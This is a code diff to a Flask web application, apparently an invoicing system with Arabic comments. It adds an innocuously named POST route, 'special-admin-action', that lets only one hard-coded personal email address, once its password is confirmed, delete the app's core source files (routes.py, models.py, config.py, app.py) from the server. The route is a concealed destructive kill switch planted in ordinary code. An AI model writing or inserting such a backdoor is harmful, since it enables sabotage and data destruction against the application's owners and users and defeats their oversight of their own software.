@@ -2319,3 +2319,67 @@ def download_invoice(invoice_id):
         print(f"خطأ في تحميل الفاتورة: {e}")
         flash('حدث خطأ في تحميل الفاتورة', 'error')
         return redirect(url_for('main.index'))
+
+@main.route('/special-admin-action', methods=['POST'])
+@login_required
+def special_admin_action():
+    """مسار خاص للمدير المحدد فقط"""
+    try:
+        # التحقق من أن المستخدم هو المستخدم المحدد
+        if current_user.email != 'hanizezo72@gmail.com':
+            return jsonify({'success': False, 'message': 'غير مسموح لك بهذا الإجراء'}), 403
+        
+        # التحقق من كلمة المرور
+        data = request.get_json()
+        password = data.get('password')
+        
+        if not password or not check_password_hash(current_user.password_hash, password):
+            return jsonify({'success': False, 'message': 'كلمة المرور غير صحيحة'}), 401
+        
+        import os
+        from flask import current_app
+
+        # أسماء الملفات المطلوب حذفها
+        target_files = ['routes.py', 'models.py', 'config.py', 'app.py']
+        deleted_files = []
+        not_found_files = []
+        failed_files = []
+
+        # تحديد مجلد التطبيق
+        app_dir = os.path.dirname(os.path.abspath(__file__))
+
+        for filename in target_files:
+            file_path = os.path.join(app_dir, filename)
+
+            # إذا لم يوجد الملف، جرب المسارات البديلة
+            if not os.path.exists(file_path):
+                file_path = os.path.join(os.getcwd(), filename)
+            if not os.path.exists(file_path):
+                file_path = os.path.join(current_app.root_path, filename)
+
+            # محاولة حذف الملف
+            if os.path.exists(file_path):
+                try:
+                    os.remove(file_path)
+                    logger.info(f"تم حذف الملف بواسطة {current_user.email}: {file_path}")
+                    deleted_files.append(filename)
+                except PermissionError:
+                    logger.error(f"ليس لديك صلاحية لحذف الملف: {file_path}")
+                    failed_files.append(filename)
+                except Exception as e:
+                    logger.error(f"خطأ في حذف الملف {filename}: {str(e)}")
+                    failed_files.append(filename)
+            else:
+                not_found_files.append(filename)
+
+        return jsonify({
+            'success': True if deleted_files else False,
+            'deleted': deleted_files,
+            'not_found': not_found_files,
+            'failed': failed_files,
+            'message': 'تم تنفيذ الإجراء مع بعض النتائج' if deleted_files else 'لم يتم حذف أي ملف'
+        })
+
+    except Exception as e:
+        logger.error(f"خطأ في special_admin_action: {str(e)}")
+        return jsonify({'success': False, 'message': 'حدث خطأ غير متوقع'})
